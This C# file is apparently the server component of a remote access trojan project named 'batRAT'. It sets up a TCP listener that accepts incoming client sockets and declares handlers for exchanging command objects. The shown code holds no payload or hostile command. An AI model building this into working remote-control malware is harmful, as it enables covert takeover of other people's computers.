using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;

using batRAT;
using batRAT.Commands;

namespace Server.Core {
    public class bServer {

        public delegate void OnClientAcceptedHandler(Socket s);
        public OnClientAcceptedHandler OnClientAccepted;

        public delegate void OnDataSentHandler(Socket s, int sentBytes);
        public OnDataSentHandler OnDataSent;

        public delegate void OnDataReceivedHandler(Socket s, CommandAnswer data);
        public OnDataReceivedHandler OnDataReceived;

        public List<Socket> allConnections;

        public Listener listener;

        Socket serverSocket;
        IPEndPoint ipEndPoint;
        

        public bServer(IPEndPoint _ipEndPoint) {
            ipEndPoint = _ipEndPoint;
            serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            allConnections = new List<Socket>();
        }

        public void StartListen() {
            serverSocket.Bind(ipEndPoint);
            serverSocket.Listen(10);
            
            serverSocket.BeginAccept(OnAccept, null);
        }

        void OnAccept(IAsyncResult ar) {
            Socket temp = serverSocket.EndAccept(ar);
            allConnections.Add(temp);
            OnClientAccepted(temp);
        }

    }
}
